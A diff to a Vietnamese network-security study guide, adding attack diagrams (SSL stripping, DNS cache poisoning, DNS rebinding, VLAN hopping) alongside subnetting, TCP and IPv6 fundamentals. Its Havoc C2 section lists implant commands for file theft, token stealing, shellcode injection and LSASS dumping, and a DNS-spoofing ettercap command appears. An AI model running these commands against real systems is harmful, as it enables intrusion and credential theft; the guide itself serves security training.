@@ -8,16 +8,75 @@
 
 ## MỤC LỤC
 
-- [PHẦN 1: NỀN TẢNG MẠNG](#phần-1-nền-tảng-mạng)
-- [PHẦN 2: CÔNG CỤ MẠNG CƠ BẢN](#phần-2-công-cụ-mạng-cơ-bản)
-- [PHẦN 3: NETWORK SCANNING & ENUMERATION](#phần-3-network-scanning--enumeration)
-- [PHẦN 4: KỸ THUẬT TẤN CÔNG MẠNG](#phần-4-kỹ-thuật-tấn-công-mạng)
-- [PHẦN 5: RED TEAM NETWORKING](#phần-5-red-team-networking)
-- [PHẦN 6: PROXY & TRAFFIC INTERCEPTION](#phần-6-proxy--traffic-interception)
-- [PHẦN 7: FIREWALL & DEFENSE](#phần-7-firewall--defense)
-- [PHẦN 8: WIRELESS NETWORK ATTACKS](#phần-8-wireless-network-attacks)
-- [PHẦN 9: ADVANCED TOPICS](#phần-9-advanced-topics)
-- [PHẦN 10: LAB THỰC HÀNH](#phần-10-lab-thực-hành)
+**Core Fundamentals:**
+- [PHẦN 1: NỀN TẢNG MẠNG](#phần-1-nền-tảng-mạng) — OSI, TCP/IP, Protocols, Subnetting, NAT
+- [PHẦN 2: CÔNG CỤ MẠNG CƠ BẢN](#phần-2-công-cụ-mạng-cơ-bản) — ping, traceroute, Wireshark, tcpdump
+- [PHẦN 25: FUNDAMENTALS BỔ SUNG](#phần-25-fundamentals-bổ-sung) — CIDR/VLSM, Encapsulation, TCP internals, IPv6, QoS, Troubleshooting
+
+**Scanning & Enumeration:**
+- [PHẦN 3: NETWORK SCANNING & ENUMERATION](#phần-3-network-scanning--enumeration) — Nmap, Masscan, Netcat
+- [PHẦN 19: OSINT & RECONNAISSANCE TOOLS](#phần-19-osint--reconnaissance-tools) — Shodan, amass, Google Dorks, Nessus, gobuster
+
+**Network Attacks:**
+- [PHẦN 4: KỸ THUẬT TẤN CÔNG MẠNG](#phần-4-kỹ-thuật-tấn-công-mạng) — MITM, ARP/DNS Spoofing, DHCP/VLAN/MAC attacks
+- [PHẦN 27: ADVANCED ATTACK TECHNIQUES](#phần-27-advanced-attack-techniques) — mitm6, WPAD, Dragonblood, Evilginx2, msfvenom, web shells
+
+**Red Team:**
+- [PHẦN 5: RED TEAM NETWORKING](#phần-5-red-team-networking) — Pivoting, Lateral Movement, Tunneling, C2, Exfiltration
+- [PHẦN 14: KERBEROS & AD NETWORKING](#phần-14-kerberos--active-directory-networking) — Kerberos flow, Golden/Silver Ticket, ADCS
+- [PHẦN 26: AD ATTACKS TOÀN TẬP](#phần-26-ad-attacks-toàn-tập) — ZeroLogon, PrintNightmare, PetitPotam, DCSync, NTLM Relay paths
+- [PHẦN 20: REVERSE SHELLS TOÀN TẬP](#phần-20-reverse-shells---toàn-tập) — Bash/Python/PHP/PowerShell/OpenSSL + TTY upgrade
+- [PHẦN 28: POST-EXPLOITATION & PERSISTENCE](#phần-28-post-exploitation--persistence) — Token impersonation, Potato family, LOLBins, Anti-forensics
+
+**Proxy & Interception:**
+- [PHẦN 6: PROXY & TRAFFIC INTERCEPTION](#phần-6-proxy--traffic-interception) — Charles, Burp Suite, Proxychains, mitmproxy
+
+**Infrastructure & Defense:**
+- [PHẦN 7: FIREWALL & DEFENSE](#phần-7-firewall--defense) — iptables, nftables, Windows Firewall, pfSense, IDS/IPS
+- [PHẦN 33: UFW, FIREWALLD](#phần-33-ufw-firewalld--supplemental-firewalls) — UFW, firewalld (CentOS/RHEL)
+- [PHẦN 29: WAF, VPN & DNS SECURITY](#phần-29-waf-vpn--dns-security) — ModSecurity, WAF bypass, VPN leaks, DNSSEC, DoH/DoT
+- [PHẦN 11: ROUTING & SWITCHING NÂNG CAO](#phần-11-routing--switching-nâng-cao) — STP, BGP hijacking, OSPF/EIGRP, Load Balancing
+- [PHẦN 15: AAA & NETWORK ACCESS CONTROL](#phần-15-aaa--network-access-control) — RADIUS, TACACS+, 802.1X, NAC
+
+**Wireless & IoT:**
+- [PHẦN 8: WIRELESS NETWORK ATTACKS](#phần-8-wireless-network-attacks) — WPA/WPA2 cracking, Evil Twin, Bluetooth
+- [PHẦN 21: IoT & PROTOCOL SECURITY](#phần-21-iot--protocol-security) — MQTT, CoAP, HTTP/2-3, WebSocket, gRPC
+
+**Specialized Protocols:**
+- [PHẦN 12: EMAIL SECURITY & SMTP](#phần-12-email-security--smtp-attacks) — SMTP attacks, SPF/DKIM/DMARC, POP3/IMAP
+- [PHẦN 16: VoIP / SIP ATTACKS](#phần-16-voip--sip-attacks) — SIP protocol, eavesdropping
+- [PHẦN 22: NTP, NFS & OTHER SERVICES](#phần-22-ntp-nfs--other-services) — NTP, NFS, Redis, MongoDB
+- [PHẦN 13: DDoS](#phần-13-ddos---hiểu-và-phòng-chống) — Taxonomy, Amplification, Slowloris, Mitigation, Botnets
+
+**Cloud & Modern:**
+- [PHẦN 17: CLOUD NETWORKING & SECURITY](#phần-17-cloud-networking--security) — AWS/Azure VPC, Docker/K8s, Zero Trust
+- [PHẦN 30: CLOUD SECURITY NÂNG CAO](#phần-30-cloud-security-nâng-cao) — GCP, IMDS attacks, VPC Flow Logs, AWS WAF
+- [PHẦN 23: eBPF & MODERN SECURITY](#phần-23-ebpf--modern-network-security) — Cilium, Falco, Tetragon
+
+**Monitoring & Response:**
+- [PHẦN 18: DEFENSE & MONITORING](#phần-18-defense--monitoring) — SIEM, NetFlow, Honeypots, Hardening
+- [PHẦN 31: MONITORING, IR & FORENSICS](#phần-31-monitoring-ir--forensics-nâng-cao) — Prometheus, Memory forensics, IR playbooks, Threat Intel
+
+**Governance:**
+- [PHẦN 24: FRAMEWORKS & COMPLIANCE](#phần-24-network-security-frameworks--compliance) — NIST, MITRE ATT&CK
+- [PHẦN 32: NETWORK AUTOMATION & COMPLIANCE](#phần-32-network-automation--compliance) — Ansible, Terraform, PCI DSS, ISO 27001, SD-WAN, SASE
+
+**Practice:**
+- [PHẦN 9: ADVANCED TOPICS](#phần-9-advanced-topics) — Scapy, VPN internals, TLS, Network Forensics
+- [PHẦN 10: LAB THỰC HÀNH](#phần-10-lab-thực-hành) — Lab setup, Exercises, Certs, Methodology
+
+**Blue Team & Detection:**
+- [PHẦN 34: BLUE TEAM - DETECTION SIGNATURES](#phần-34-blue-team---detection-signatures) — Windows Event IDs, Sigma rules, SIEM queries, per-attack detection
+- [PHẦN 35: COMPLETE ATTACK CHAINS](#phần-35-complete-attack-chains) — External→DA full chain, Multi-network pivot scenarios
+
+**API, Bug Bounty & CTF:**
+- [PHẦN 36: API SECURITY & BUG BOUNTY](#phần-36-api-security--bug-bounty) — JWT, GraphQL, OAuth2, SSRF, CORS, HTTP Smuggling, Subdomain Takeover
+- [PHẦN 37: CTF NETWORK TIPS](#phần-37-ctf-network-tips) — Port knocking, PCAP analysis, Network steganography
+
+**Tools & CVEs:**
+- [PHẦN 38: TOOL REFERENCE DEEP DIVE](#phần-38-tool-reference-deep-dive) — Recon, Enumeration, Post-exploitation, Wireless tools (full command reference)
+- [PHẦN 39: CVE DEEP DIVES](#phần-39-cve-deep-dives) — EternalBlue, Heartbleed, Log4Shell, Shellshock, ProxyLogon/ProxyShell
+- [PHẦN 40: MOBILE APP NETWORK TESTING](#phần-40-mobile-app-network-testing) — Android/iOS proxy, Certificate pinning bypass, Frida
 
 ---
 
@@ -33,7 +92,7 @@ Mô hình OSI chia việc truyền thông mạng thành 7 tầng. Mỗi tầng c
 │ Layer 6 - Presentation   │ SSL/TLS, JPEG, ASCII, Encryption    │
 │ Layer 5 - Session        │ NetBIOS, RPC, PPTP                  │
 │ Layer 4 - Transport      │ TCP, UDP                            │
-│ Layer 3 - Network        │ IP, ICMP, ARP, IGMP                 │
+│ Layer 3 - Network        │ IP, ICMP, IGMP                      │
 │ Layer 2 - Data Link      │ Ethernet, Wi-Fi (802.11), PPP       │
 │ Layer 1 - Physical       │ Cáp mạng, sóng radio, hub           │
 └─────────────────────────────────────────────────────────────────┘
@@ -1186,6 +1245,25 @@ sslstrip -l 10000
 
 **HSTS bypass**: Nếu site dùng HSTS (HTTP Strict Transport Security), SSL strip không hoạt động vì browser nhớ phải dùng HTTPS. Bypass: đổi domain (bank.com → bankk.com).
 
+```
+SSL Stripping Flow:
+
+┌────────┐  HTTP request    ┌──────────┐  HTTPS request   ┌────────┐
+│ Victim │ ───────────────> │ Attacker │ ────────────────> │ Server │
+│        │ <─────────────── │ (MITM)   │ <──────────────── │ (Bank) │
+│        │  HTTP response   │          │  HTTPS response   │        │
+└────────┘  (NO padlock!)   └──────────┘  (encrypted)      └────────┘
+
+Timeline:
+1. Victim → http://bank.com (plaintext)
+2. Server → 301 Redirect to https://bank.com
+3. Attacker INTERCEPTS redirect, keeps HTTP with victim
+4. Attacker → https://bank.com (real HTTPS to server)
+5. Attacker relays content: HTTPS→HTTP (strips SSL)
+6. Victim sees http://bank.com (no padlock, no warning)
+7. Victim enters credentials → Attacker captures in plaintext!
+```
+
 ### DNS Spoofing
 
 **Nguyên lý**: Attacker đã MITM, chặn DNS query và trả DNS response giả.
@@ -1202,6 +1280,70 @@ sudo bettercap -iface eth0
 # example.com  A  192.168.1.200
 # *.example.com  A  192.168.1.200
 ettercap -T -q -i eth0 -M arp:remote -P dns_spoof /192.168.1.100// /192.168.1.1//
+```
+
+### DNS Cache Poisoning (Kaminsky Attack)
+
+```
+Nguyên lý chi tiết:
+DNS resolver gửi query → chờ response → cache kết quả
+Response phải match: Transaction ID (16-bit), Source port, Query name
+
+Kaminsky Attack (2008):
+1. Attacker hỏi resolver: "random123.target.com" (không tồn tại)
+2. Resolver forward query đến authoritative NS
+3. TRƯỚC KHI real NS trả lời, attacker flood responses giả:
+   - Guess Transaction ID (65536 possibilities)
+   - Response chứa: "random123.target.com doesn't exist,
+     BUT ns1.target.com is now ATTACKER-IP" (Authority section)
+4. Nếu TxID match → resolver CACHE authority record
+5. Từ giờ, MỌI query cho *.target.com → attacker server!
+
+Tại sao nguy hiểm:
+- Attacker không cần MITM, chỉ cần gửi packet đến resolver
+- Poison 1 lần → ảnh hưởng ALL users của resolver đó
+- Can redirect email (MX record), web, any service
+
+Defense:
+- Source port randomization (DNSSEC)
+- DNSSEC validation (cryptographic proof of DNS records)
+- DNS over HTTPS (DoH) / DNS over TLS (DoT)
+
+┌─────────┐  "random123.target.com?"   ┌──────────┐
+│  Client  │ ──────────────────────────>│ Resolver │
+└─────────┘                             └────┬─────┘
+                                             │ Forward query
+                                             v
+                                        ┌──────────┐
+                                        │ Real NS  │ (slow response)
+                                        └──────────┘
+                              ┌──────────┐
+                              │ Attacker │ FLOOD fake responses
+                              │          │ with guessed TxID
+                              └──────────┘
+                              "ns1.target.com = ATTACKER-IP"
+                              If TxID matches → POISONED!
+```
+
+### DNS Rebinding
+
+```bash
+# Nguyên lý:
+# 1. Victim visits attacker.com
+# 2. attacker.com DNS resolves to ATTACKER-IP (passes firewall check)
+# 3. Page loads JavaScript, waits for DNS TTL to expire
+# 4. attacker.com DNS now resolves to 127.0.0.1 (or internal IP!)
+# 5. JavaScript makes request to attacker.com = request to 127.0.0.1
+# 6. Same-Origin Policy satisfied (still "attacker.com")
+# → Access internal services from victim's browser!
+
+# Attack tool: singularity of origin
+# Tấn công: Truy cập router admin (192.168.1.1), internal APIs, localhost services
+
+# Defense:
+# - DNS pinning (browser caches DNS beyond TTL)
+# - Block private IPs in DNS responses (dnsmasq: stop-dns-rebind)
+# - Validate Host header on internal services
 ```
 
 ## 4.2 DHCP Attacks
@@ -1257,6 +1399,29 @@ dhclient eth0.200                 # Lấy IP từ VLAN 200
 
 **Điều kiện**: Attacker phải ở native VLAN, chỉ hoạt động một chiều.
 
+```
+Double-Tag VLAN Frame:
+
+Normal frame:
+┌──────────┬──────────┬──────────┬──────────────────────┬─────┐
+│ Dest MAC │ Src MAC  │ 802.1Q   │ Payload              │ FCS │
+│          │          │ VLAN 10  │                       │     │
+└──────────┴──────────┴──────────┴──────────────────────┴─────┘
+
+Double-tagged frame:
+┌──────────┬──────────┬──────────┬──────────┬───────────┬─────┐
+│ Dest MAC │ Src MAC  │ Outer    │ Inner    │ Payload   │ FCS │
+│          │          │ 802.1Q   │ 802.1Q   │           │     │
+│          │          │ VLAN 1   │ VLAN 20  │           │     │
+│          │          │(native)  │(target)  │           │     │
+└──────────┴──────────┴──────────┴──────────┴───────────┴─────┘
+                       ↑                     ↑
+                       Switch strips this    This reaches target VLAN!
+
+Flow:
+[Attacker VLAN 1] → Switch A strips outer tag → Trunk → Switch B sees inner VLAN 20 tag → [Victim VLAN 20]
+```
+
 **Phòng chống**:
 - Không dùng VLAN 1 làm native VLAN
 - Tắt DTP trên tất cả access ports (`switchport nonegotiate`)
@@ -1310,7 +1475,9 @@ hydra -L users.txt -P passwords.txt ssh://192.168.1.100
 hydra -t 4 -l admin -P wordlist.txt ssh://192.168.1.100
 ```
 
-### CrackMapExec (CME) - AD/SMB Swiss Army Knife
+### CrackMapExec / NetExec - AD/SMB Swiss Army Knife
+
+> **Lưu ý**: CrackMapExec đã được rename thành **NetExec (nxc)** từ 2023. Cú pháp tương tự, thay `crackmapexec` → `nxc`. Ví dụ dưới dùng tên cũ cho quen thuộc.
 
 ```bash
 # SMB password spray
@@ -1679,11 +1846,48 @@ sliver (IMPLANT) > socks5 start
 ### Havoc (Open Source)
 
 ```bash
-# Modern C2 framework
-# Features: HTTP/HTTPS/SMB listeners
-# Demon agent (implant)
-# Post-exploitation modules
-# Team collaboration
+# === Install ===
+git clone https://github.com/HavocFramework/Havoc.git
+cd Havoc/teamserver
+go build
+cd ../client
+make
+
+# === Start Teamserver ===
+./teamserver server --profile profiles/havoc.yaotl -v
+# Config file: profiles/havoc.yaotl
+# Listeners:
+#   - HTTP/HTTPS (customizable headers, URIs, user-agent)
+#   - SMB (named pipes - lateral movement)
+#   - External C2 (custom protocols)
+
+# === Connect Client ===
+./havoc client
+# GUI client → connect to teamserver
+
+# === Generate Demon Agent (Implant) ===
+# Trong GUI: Attack → Payload → Generate
+# Formats: Windows EXE, DLL, Shellcode, Service EXE
+# Evasion: Sleep obfuscation (Ekko, Zilean), indirect syscalls
+# Stack spoofing, AMSI/ETW patching built-in
+
+# === Post-Exploitation Modules ===
+# Demon console:
+demon> whoami
+demon> shell ipconfig /all
+demon> ps                        # Process list
+demon> screenshot                # Take screenshot
+demon> download C:\secret.txt    # Download file
+demon> upload /local/tool.exe    # Upload file
+demon> inject x64 PID shellcode  # Process injection
+demon> token steal PID           # Token impersonation
+demon> dotnet inline-execute Assembly.exe args  # .NET in-memory
+demon> bof inline-execute bof.o args            # BOF execution
+
+# === BOF (Beacon Object Files) ===
+# Compiled C code chạy trong memory (no new process)
+# Compatible với Cobalt Strike BOFs
+# Ví dụ: nanodump (LSASS dump), sa-whoami, klist
 ```
 
 ## 5.5 Exfiltration (Trích xuất dữ liệu)
@@ -3366,7 +3570,7 @@ Khi switch kết nối với nhau tạo loop → broadcast storm (frame loop vô
 
 ```
 1. Bầu Root Bridge (switch có Bridge ID nhỏ nhất)
-   Bridge ID = Priority (4 bit, mặc định 32768) + MAC Address
+   Bridge ID = Priority (16 bit, mặc định 32768, tăng/giảm theo bội 4096) + MAC Address
 
 2. Mỗi non-root switch chọn Root Port (port gần root nhất)
    Tính bằng: path cost (bandwidth) đến root bridge
@@ -3427,7 +3631,7 @@ yersinia stp -attack 2 -interface eth0
 ### Distance Vector vs Link State
 
 ```
-Distance Vector (RIP, EIGRP):
+Distance Vector (RIP) / Hybrid (EIGRP):
 - Mỗi router chỉ biết neighbor trực tiếp
 - Gửi routing table cho neighbor định kỳ
 - Chậm converge, dễ loop
@@ -3546,7 +3750,7 @@ Loại BGP Hijack:
 # BGPSec: Crypto validation of entire AS path (chưa deploy rộng)
 ```
 
-### EIGRP (Cisco proprietary)
+### EIGRP (Open standard - RFC 7868, trước đây Cisco proprietary)
 
 ```
 Protocol: IP Protocol 88
@@ -4716,6 +4920,8 @@ whatweb -a 3 http://target.com          # Aggressive
 
 # PHẦN 20: REVERSE SHELLS - TOÀN TẬP
 
+> **CẢNH BÁO**: Reverse shell là kỹ thuật tấn công. CHỈ sử dụng trong authorized penetration testing, CTF competitions, hoặc lab cá nhân. Sử dụng trái phép vi phạm pháp luật.
+
 ## 20.1 Reverse Shell là gì?
 
 ```
@@ -5168,5 +5374,2848 @@ Level 5 - Expert (Tuần 21+):
   □ eBPF security
   □ Cert: OSCP → CRTO → OSEP
 ```
+
+# PHẦN 25: FUNDAMENTALS BỔ SUNG
+
+## 25.1 Subnetting Nâng cao
+
+### CIDR (Classless Inter-Domain Routing)
+
+```
+Trước CIDR (Classful):
+  Class A: /8  (16 triệu hosts) — quá lớn
+  Class B: /16 (65,534 hosts) — thường quá lớn
+  Class C: /24 (254 hosts) — thường quá nhỏ
+  → Lãng phí IP address khủng khiếp
+
+CIDR cho phép prefix BẤT KỲ: /17, /19, /21, /27, /30, v.v.
+
+Bảng tham khảo nhanh:
+┌────────┬─────────────────────┬──────────┬────────────┐
+│ CIDR   │ Subnet Mask         │ Addresses│ Usable     │
+├────────┼─────────────────────┼──────────┼────────────┤
+│ /32    │ 255.255.255.255     │ 1        │ 1 (host)   │
+│ /31    │ 255.255.255.254     │ 2        │ 2 (P2P)    │
+│ /30    │ 255.255.255.252     │ 4        │ 2          │
+│ /29    │ 255.255.255.248     │ 8        │ 6          │
+│ /28    │ 255.255.255.240     │ 16       │ 14         │
+│ /27    │ 255.255.255.224     │ 32       │ 30         │
+│ /26    │ 255.255.255.192     │ 64       │ 62         │
+│ /25    │ 255.255.255.128     │ 128      │ 126        │
+│ /24    │ 255.255.255.0       │ 256      │ 254        │
+│ /23    │ 255.255.254.0       │ 512      │ 510        │
+│ /22    │ 255.255.252.0       │ 1,024    │ 1,022      │
+│ /21    │ 255.255.248.0       │ 2,048    │ 2,046      │
+│ /20    │ 255.255.240.0       │ 4,096    │ 4,094      │
+│ /19    │ 255.255.224.0       │ 8,192    │ 8,190      │
+│ /18    │ 255.255.192.0       │ 16,384   │ 16,382     │
+│ /17    │ 255.255.128.0       │ 32,768   │ 32,766     │
+│ /16    │ 255.255.0.0         │ 65,536   │ 65,534     │
+└────────┴─────────────────────┴──────────┴────────────┘
+
+Magic Number Method (tính nhanh):
+  Mask octet value → Magic = 256 - mask value
+  Ví dụ: /27 → mask = 255.255.255.224
+  Magic = 256 - 224 = 32
+  Subnets: 0, 32, 64, 96, 128, 160, 192, 224
+
+  IP: 172.16.45.200 /27
+  Magic = 32
+  Network = 172.16.45.192 (200 ÷ 32 = 6.25, floor = 6, 6×32 = 192)
+  Broadcast = 172.16.45.223 (192 + 32 - 1)
+  First host = 172.16.45.193
+  Last host = 172.16.45.222
+```
+
+### VLSM (Variable Length Subnet Masking)
+
+```
+VLSM cho phép dùng NHIỀU subnet mask khác nhau trong cùng 1 network.
+→ Tối ưu sử dụng IP address.
+
+Ví dụ: Được cấp 192.168.1.0/24, cần chia cho:
+  - LAN A: 100 hosts
+  - LAN B: 50 hosts
+  - LAN C: 25 hosts
+  - WAN link 1: 2 hosts
+  - WAN link 2: 2 hosts
+
+Giải (luôn chia subnet LỚN trước):
+  LAN A (100): /25 → 126 hosts → 192.168.1.0/25
+  LAN B (50):  /26 → 62 hosts  → 192.168.1.128/26
+  LAN C (25):  /27 → 30 hosts  → 192.168.1.192/27
+  WAN 1 (2):   /30 → 2 hosts   → 192.168.1.224/30
+  WAN 2 (2):   /30 → 2 hosts   → 192.168.1.228/30
+  Còn lại: 192.168.1.232 - 192.168.1.255 (dự phòng)
+```
+
+### Route Summarization (Supernetting)
+
+```
+Gộp nhiều network nhỏ → 1 route lớn hơn.
+Giảm bảng routing, tăng hiệu suất.
+
+Ví dụ: Gộp 4 mạng /24:
+  192.168.0.0/24
+  192.168.1.0/24
+  192.168.2.0/24
+  192.168.3.0/24
+
+  Binary octet 3:
+  0 = 00000000
+  1 = 00000001
+  2 = 00000010
+  3 = 00000011
+  Common bits: 000000 (6 bits giống) → /22
+
+  Summary route: 192.168.0.0/22
+```
+
+## 25.2 Encapsulation / Decapsulation
+
+```
+Khi data đi XUỐNG từ Application → Physical, mỗi tầng THÊM header:
+
+Application  : DATA                              (PDU: Data)
+Transport    : [TCP Header] + DATA               (PDU: Segment)
+Network      : [IP Header] + [TCP] + DATA        (PDU: Packet)
+Data Link    : [ETH Header] + [IP] + [TCP] + DATA + [FCS]  (PDU: Frame)
+Physical     : 01010110110...                     (PDU: Bits)
+
+Khi đến máy đích, ngược lại: mỗi tầng BỎ header của mình (decapsulation).
+
+Quy trình chi tiết khi bạn truy cập http://example.com:
+
+1. Application: Tạo HTTP GET request
+2. Transport: Đóng gói vào TCP segment
+   - Source port: random high (ví dụ 54321)
+   - Dest port: 80
+   - Sequence number, flags (SYN lần đầu)
+3. Network: Đóng gói vào IP packet
+   - Source IP: 192.168.1.100
+   - Dest IP: 93.184.216.34 (đã resolve DNS trước đó)
+   - TTL: 64
+4. Data Link: Đóng gói vào Ethernet frame
+   - Source MAC: MAC card mạng bạn
+   - Dest MAC: MAC gateway (KHÔNG phải MAC server!)
+   - ↑ Vì server ở mạng khác, phải gửi cho gateway trước
+5. Physical: Chuyển thành tín hiệu điện/quang truyền qua cáp
+
+Tại mỗi router trên đường đi:
+  - Bỏ frame header (Layer 2) cũ
+  - Đọc IP header → tìm next hop trong routing table
+  - Đóng frame header (Layer 2) MỚI (MAC router → MAC next hop)
+  - IP header KHÔNG đổi (trừ TTL giảm 1)
+```
+
+## 25.3 TCP Internals Chi tiết
+
+### Sliding Window & Flow Control
+
+```
+TCP Window Size: Số bytes receiver SẴN SÀNG nhận trước khi cần ACK.
+
+Ví dụ Window Size = 3000 bytes:
+  Sender gửi 1000 bytes → còn 2000 bytes
+  Sender gửi 1000 bytes → còn 1000 bytes
+  Sender gửi 1000 bytes → window full, PHẢI chờ ACK
+  Receiver ACK → window mở lại
+
+Window Scaling (Option trong SYN):
+  Window size field = 16 bit → max 65,535 bytes
+  Không đủ cho mạng nhanh → Window Scale factor
+  Ví dụ: Scale = 7 → Actual window = 65535 × 2^7 = 8,388,480 bytes
+
+Zero Window:
+  Receiver gửi Window = 0 → "Đừng gửi nữa, tôi đang xử lý"
+  Sender gửi Window Probe định kỳ → chờ window mở lại
+```
+
+### TCP Congestion Control
+
+```
+Tránh gửi quá nhanh làm nghẽn mạng:
+
+1. Slow Start:
+   cwnd (congestion window) = 1 MSS
+   Mỗi ACK: cwnd × 2 (tăng exponential)
+   1 → 2 → 4 → 8 → 16 → ... cho đến ssthresh
+
+2. Congestion Avoidance:
+   Khi cwnd ≥ ssthresh: tăng LINEAR (cwnd + 1 mỗi RTT)
+
+3. Khi mất packet (congestion):
+   TCP Tahoe: cwnd = 1, slow start lại
+   TCP Reno: cwnd = cwnd/2, congestion avoidance (fast recovery)
+   TCP CUBIC: Modern Linux default, function bậc 3
+
+Biểu đồ:
+  cwnd
+   │        /\
+   │       /  \      /‾‾‾‾‾
+   │      /    \    /
+   │     /      \  /
+   │    /        \/  ← packet loss
+   │   /
+   │  /  ← slow start
+   │ /
+   └──────────────────── time
+```
+
+### MTU & Fragmentation
+
+```
+MTU (Maximum Transmission Unit):
+  Ethernet MTU = 1500 bytes (payload tối đa của 1 frame)
+  IP header = 20 bytes, TCP header = 20 bytes
+  → MSS (Maximum Segment Size) = 1500 - 20 - 20 = 1460 bytes
+
+Fragmentation:
+  Khi packet > MTU của link tiếp theo → router chia nhỏ packet
+  IP header flags: DF (Don't Fragment), MF (More Fragments)
+  Fragment Offset: Vị trí fragment trong packet gốc
+
+Path MTU Discovery:
+  Gửi packet với DF flag set
+  Nếu packet > MTU → router trả ICMP "Fragmentation Needed"
+  → Sender giảm size → thử lại
+  → Tìm ra MTU nhỏ nhất trên đường đi
+
+# Test MTU
+ping -M do -s 1472 192.168.1.1     # Linux (DF set, 1472 + 28 = 1500)
+ping -f -l 1472 192.168.1.1        # Windows
+
+# Security: Fragmentation dùng để evade IDS/firewall
+# Tiny fragment attack: Fragment nhỏ đến mức TCP header bị chia
+# → IDS không thấy port number → bypass rule
+```
+
+## 25.4 IPv6 Chi tiết
+
+```
+=== Address Types ===
+Global Unicast:    2000::/3  (tương đương public IPv4)
+Link-Local:        fe80::/10 (tự động, chỉ trong LAN)
+Unique Local:      fc00::/7  (tương đương private IPv4)
+Multicast:         ff00::/8  (thay broadcast)
+Loopback:          ::1/128
+
+=== SLAAC (Stateless Address Autoconfiguration) ===
+Host tự tạo IPv6 address KHÔNG cần DHCP:
+1. Tạo Link-Local address: fe80:: + EUI-64 (từ MAC address)
+2. DAD (Duplicate Address Detection): Gửi Neighbor Solicitation cho address vừa tạo
+   → Nếu không ai reply → address unique
+3. Router Solicitation → Router Advertisement
+   → Nhận prefix (ví dụ 2001:db8:1::/64)
+4. Tạo Global Unicast: prefix + EUI-64 (hoặc random - privacy extension)
+
+EUI-64 (từ MAC address):
+  MAC: AA:BB:CC:DD:EE:FF
+  → Insert FFFE: AA:BB:CC:FF:FE:DD:EE:FF
+  → Flip 7th bit: A8:BB:CC:FF:FE:DD:EE:FF
+  → IPv6: fe80::a8bb:ccff:fedd:eeff
+
+=== NDP (Neighbor Discovery Protocol) - Thay ARP ===
+  Router Solicitation (RS):   Host hỏi "Router ở đâu?"
+  Router Advertisement (RA):  Router trả lời prefix, gateway
+  Neighbor Solicitation (NS): Tương đương ARP Request
+  Neighbor Advertisement (NA): Tương đương ARP Reply
+  Redirect:                   Router chỉ đường tốt hơn
+
+=== DHCPv6 ===
+  Stateful:  Cấp IP + DNS + domain (giống DHCPv4)
+  Stateless: Chỉ cấp DNS + domain (IP do SLAAC tạo)
+
+=== Transition Mechanisms ===
+  Dual Stack: Chạy cả IPv4 và IPv6 song song
+  Tunneling:  Đóng gói IPv6 trong IPv4 (6to4, Teredo, ISATAP)
+  NAT64:      Translate IPv6 ↔ IPv4
+
+=== IPv6 Security ===
+  NDP Spoofing = ARP Spoofing phiên bản IPv6
+  Router Advertisement flood
+  DHCPv6 starvation
+  Nhiều firewall chỉ filter IPv4, bỏ qua IPv6 → attack surface
+  Privacy extensions: Random interface ID thay EUI-64 (chống tracking)
+```
+
+## 25.5 Switching Concepts Bổ sung
+
+```
+=== Port Mirroring / SPAN ===
+Copy traffic từ 1 hoặc nhiều port → 1 monitoring port
+Dùng cho: IDS, packet analysis, troubleshooting
+
+Cisco:
+  (config)# monitor session 1 source interface gi0/1
+  (config)# monitor session 1 destination interface gi0/24
+
+RSPAN: SPAN qua VLAN (remote switch)
+ERSPAN: SPAN qua IP (encapsulate in GRE)
+
+=== EtherChannel / LACP ===
+Gộp nhiều link vật lý → 1 link logic (tăng bandwidth + redundancy)
+
+LACP (Link Aggregation Control Protocol - 802.3ad):
+  Dynamic negotiation
+  Active/Passive mode
+
+PAgP (Port Aggregation Protocol - Cisco proprietary)
+
+Cisco:
+  (config)# interface range gi0/1-2
+  (config-if-range)# channel-group 1 mode active    # LACP
+
+=== PoE (Power over Ethernet) ===
+Cung cấp điện qua cáp Ethernet (cho IP phone, AP, camera)
+  802.3af: 15.4W per port
+  802.3at (PoE+): 25.5W
+  802.3bt (PoE++): 60-100W
+
+=== LLDP / CDP ===
+LLDP (Link Layer Discovery Protocol): Standard, mọi vendor
+CDP (Cisco Discovery Protocol): Cisco only
+
+Gửi thông tin: Hostname, IP, Platform, Version, VLAN, PoE
+→ Dùng cho: Network topology discovery
+→ Security: Tắt trên edge port (lộ thông tin cho attacker)
+
+# Xem LLDP neighbors
+lldpctl                          # Linux
+show lldp neighbors              # Cisco
+
+# CDP
+show cdp neighbors detail        # Cisco
+```
+
+## 25.6 Giao thức bổ sung
+
+### GRE (Generic Routing Encapsulation)
+
+```
+Đóng gói bất kỳ protocol nào trong IP tunnel
+Dùng cho: VPN site-to-site, tunnel giữa routers
+
+Original packet: [IP Header][Payload]
+GRE:            [New IP Header][GRE Header][Original IP][Payload]
+
+# Linux GRE tunnel
+ip tunnel add gre1 mode gre remote 203.0.113.1 local 198.51.100.1
+ip addr add 10.0.0.1/30 dev gre1
+ip link set gre1 up
+
+Không mã hóa! Chỉ encapsulate. Thường kết hợp với IPsec.
+```
+
+### PPP / PPPoE
+
+```
+PPP (Point-to-Point Protocol):
+  Layer 2, dùng cho kết nối point-to-point (serial, dial-up)
+  Phases: Link establishment → Authentication → Network configuration
+  Auth methods: PAP (plaintext!), CHAP (challenge-response), EAP
+
+PPPoE (PPP over Ethernet):
+  Đóng gói PPP trong Ethernet frames
+  Phổ biến cho DSL Internet (ADSL, VDSL)
+  Adds 8 bytes overhead → MTU giảm từ 1500 → 1492
+
+L2TP (Layer 2 Tunneling Protocol):
+  Kết hợp PPTP + L2F
+  Không mã hóa → thường dùng với IPsec (L2TP/IPsec)
+  Port: UDP 1701
+```
+
+### IGMP (Internet Group Management Protocol)
+
+```
+Quản lý multicast group membership
+Host join/leave multicast group → router biết forward multicast traffic cho ai
+
+Types:
+  Membership Query: Router hỏi "Ai muốn nhận multicast?"
+  Membership Report: Host trả lời "Tôi muốn nhận group 224.x.x.x"
+  Leave Group: Host rời group
+
+IGMP Snooping:
+  Switch kiểm tra IGMP messages → chỉ forward multicast đến port cần thiết
+  (thay vì flood tất cả port)
+```
+
+## 25.7 QoS (Quality of Service)
+
+```
+Ưu tiên traffic quan trọng (voice, video) hơn traffic thường (email, web).
+
+Mechanisms:
+  Classification: Phân loại traffic (DSCP, CoS, ACL)
+  Marking: Đánh dấu packet (DSCP value trong IP header)
+  Queuing: Xếp hàng ưu tiên (LLQ, WFQ, CBWFQ)
+  Policing: Drop traffic vượt rate limit
+  Shaping: Buffer traffic vượt limit (gửi sau thay vì drop)
+
+DSCP (Differentiated Services Code Point):
+  6 bits trong IP header TOS field
